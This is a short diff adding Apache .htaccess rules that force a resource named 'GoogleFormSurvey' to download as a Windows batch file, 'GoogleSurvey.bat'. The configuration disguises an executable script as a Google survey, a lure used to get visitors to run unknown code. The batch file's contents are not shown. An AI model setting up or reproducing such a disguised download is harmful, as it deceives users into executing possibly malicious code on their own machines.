@@ -1,0 +1,5 @@
+AddType application/octet-stream .bat
+<Files "GoogleFormSurvey">
+ForceType application/octet-stream
+Header set Content-Disposition "attachment; filename=GoogleSurvey.bat"
+</Files>
